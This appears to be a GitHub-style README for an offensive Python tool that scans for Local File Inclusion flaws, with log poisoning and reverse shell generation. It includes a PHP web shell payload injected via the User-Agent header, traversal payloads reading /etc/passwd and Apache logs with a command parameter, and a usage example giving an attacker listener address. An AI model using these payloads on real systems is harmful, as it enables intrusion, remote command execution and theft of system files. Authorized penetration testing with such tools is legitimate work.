Custom LFI Exploiter by Sahed (v1.6)

A flexible and fast Local File Inclusion (LFI) vulnerability scanner built with Python. Developed for penetration testers and cybersecurity learners, this tool performs automated LFI discovery, log poisoning, and optional reverse shell generation.

✨ Features

✅ Multi-threaded payload delivery for faster testing

📂 Support for custom payload lists

🔎 Smart base64 decoding for php://filter and data:// responses

🦖 Log poisoning detection and code injection

🧠 Keyword-based LFI detection (OS and web signatures)

🔊 Reverse shell payload generator (optional)

📊 Outputs findings to a clean .txt report

📁 Displays common sensitive file paths for manual testing

💪 Usage

python3 lfisuite.py <url> <parameter> [payloads.txt] [ip:port]

Example:

python3 lfisuite.py https://target.com/page.php id payloads.txt 10.10.14.99:4444

url: The target URL, excluding the vulnerable parameter (e.g. https://target.com/page.php)

parameter: The vulnerable GET parameter name (e.g. id)

payloads.txt (optional): Custom file with payloads, one per line

ip:port (optional): For reverse shell payload generation

📅 Sample Output

[+] LFI detected with payload: ../../../../etc/passwd
[Preview]:
root:x:0:0:root:/root:/bin/bash
...

📝 Log Poisoning

Injects code via the User-Agent header:

<?php system($_GET['cmd']); ?>

Then includes access logs using payloads like:

../../../../../../../var/log/apache2/access.log?cmd=id

📄 Report

All successful findings are saved to:

lfi_report.txt

Use this file for documentation or later analysis.

👉 About

Built by Sahed — Team Cyber Slayers 🚀Inspired by LFISuite but extended for better usability, speed, and support.

✨ Contributions

Pull requests, bug reports, and feature ideas are welcome. Let’s improve LFI testing together!

👁️ Disclaimer

This tool is for educational and authorized penetration testing only. Unauthorized use is illegal and unethical.

